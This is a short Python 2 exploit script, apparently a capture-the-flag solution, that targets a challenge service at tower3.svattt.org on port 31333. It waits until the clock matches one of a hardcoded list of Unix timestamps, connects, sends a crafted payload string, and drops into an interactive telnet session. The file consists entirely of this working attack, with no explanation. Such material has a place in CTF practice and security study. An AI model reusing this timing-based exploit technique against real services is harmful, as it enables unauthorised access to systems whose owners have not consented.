import socket
import struct 
import telnetlib
import os
import sys
import math
from time import *


LOCAL = ('tower3.svattt.org', 31333)
BUFFER = 4096

def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
	
ls=[0x584117b5,0x58411878,0x584118cc,0x584118fa,0x58411a6b,0x58411cdd,0x58411ce2,0x58411ddb,0x58411ddc,0x58411eb1,0x58411ed4,0x58411f70,0x58412046,0x58412063,0x584121fd,0x58412201,0x584122c7,0x584122d9,0x58412400,0x5841243d]

timestamp = hex(int(time()))
print timestamp

while(1):
	if int(time()) in ls:
		print hex(int(time()))

		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(LOCAL)
		print s.recv(1024)
		s.send("[1--1]000000[1--1]000000[1--1]000000[1--1]000000[1--1]000000[1--1]000000")
		interact()
